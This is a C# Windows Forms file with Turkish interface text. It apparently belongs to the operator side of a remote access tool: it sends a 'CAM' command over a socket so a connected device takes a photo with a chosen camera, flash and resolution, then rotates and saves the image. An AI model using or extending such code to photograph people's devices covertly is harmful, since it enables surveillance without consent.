using System;
using System.Drawing;
using System.Net.Sockets;
using System.Windows.Forms;

namespace SV
{
    public partial class Kamera : Form
    {
        Socket soketimiz;
        public string ID = "";
        public int max = 0;
        public Kamera(Socket s, string aydi)
        {
            soketimiz = s;
            ID = aydi;
            InitializeComponent();
        }
        private void button1_Click(object sender, EventArgs e)
        {
            label1.Visible = false;
            try
            {
                if (radioButton1.Checked)
                {
                    if (string.IsNullOrEmpty(comboBox1.SelectedItem.ToString()))
                    {
                        MessageBox.Show("Lütfen ön kamera için bir çözünürlük seçin.", "Uyarı", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                        return;
                    }
                }
                else
                {
                    if (string.IsNullOrEmpty(comboBox2.SelectedItem.ToString()))
                    {
                        MessageBox.Show("Lütfen arka kamera için bir çözünürlük seçin.", "Uyarı", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                        return;
                    }
                }
                Text = "Kamera";
                string cam = "";
                string flashmode = "";
                string resolution = "";
                cam = radioButton1.Checked ? "1" : "0";
                button1.Enabled = false;
                flashmode = checkBox1.Checked ? "1" : "0";
                resolution = radioButton1.Checked ? comboBox1.SelectedItem.ToString() : comboBox2.SelectedItem.ToString();
                Form1.KomutGonder("CAM", "[VERI]" + cam + "[VERI]" + flashmode + "[VERI]" + resolution + "[VERI][0x09]", soketimiz);
                label2.Text = "Çekiliyor..";
            }
            catch (Exception) { }


        }
        public Image RotateImage(Image img)
        {
            Bitmap bmp = new Bitmap(img);

            using (Graphics gfx = Graphics.FromImage(bmp))
            {
                gfx.Clear(Color.White);
                gfx.DrawImage(img, 0, 0, img.Width, img.Height);
            }

            bmp.RotateFlip(RotateFlipType.Rotate90FlipNone);
            return bmp;
        }
        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            if (pictureBox1.Image != null)
            {
                pictureBox1.Image = RotateImage(pictureBox1.Image);
            }
        }

        private void linkLabel2_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            if (pictureBox1.Image != null)
            {
                using (SaveFileDialog op = new SaveFileDialog())
                {
                    op.Filter = "Resim dosyası (*.png)|*.png";
                    op.Title = "Fotoğrafı kaydet";
                    if (op.ShowDialog() == DialogResult.OK)
                    {
                        try
                        {
                            pictureBox1.Image.Save(op.FileName);
                        }
                        catch (Exception ex) { MessageBox.Show(ex.Message, "Kayıt", MessageBoxButtons.OK, MessageBoxIcon.Exclamation); }
                    }
                }
            }
        }
    }
}